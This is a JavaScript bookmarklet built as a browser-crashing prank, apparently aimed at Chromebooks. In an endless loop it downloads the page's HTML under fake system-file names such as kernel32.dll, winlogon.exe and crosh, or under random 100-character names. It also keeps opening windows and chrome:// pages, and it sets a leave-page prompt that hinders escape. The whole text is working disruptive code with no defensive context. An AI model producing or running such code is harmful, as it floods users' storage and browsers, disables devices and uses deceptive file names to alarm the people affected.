javascript:(function() {
  const windowsFileNames = [
    'system32.dll',
    'explorer.exe',
    'kernel32.dll',
    'user32.dll',
    'notepad.exe',
    'cmd.exe',
    'msconfig.exe',
    'taskmgr.exe',
    'regedit.exe',
    'winlogon.exe',
    'services.exe'
  ];

  const chromebookFileNames = [
    'chrome.dll',
    'crosvm',
    'libchrome.so',
    'crosh',
    'filesystem',
    'libcros.so',
    'power_manager',
    'updater',
    'input_method',
    'policy',
    'runtime'
  ];

  let downloadCount = 0;

  function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }

  function downloadPageHTML() {
    let fileName;


    const randomChoice = Math.random();
    if (randomChoice < 0.33) {

      fileName = windowsFileNames[downloadCount % windowsFileNames.length];
    } else if (randomChoice < 0.67) {

      fileName = chromebookFileNames[downloadCount % chromebookFileNames.length];
    } else {
  
      fileName = generateRandomString(100) + '.html';
    }


    fileName = fileName.replace(/[<>:"/\\|?*]/g, '_');

    var blob = new Blob([document.documentElement.outerHTML], {type: 'text/html'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    a.click();
    
    downloadCount++;
  }


  window.onbeforeunload = function(event) {
    return 'Are you sure you want to leave this page?';
  };


  while (true) {
    downloadPageHTML();
    window.open('about:blank');
    window.open('_self');
    window.open('chrome://file-manager');
    window.open('chrome://settings');
    window.open('chrome://version');
  }
})();
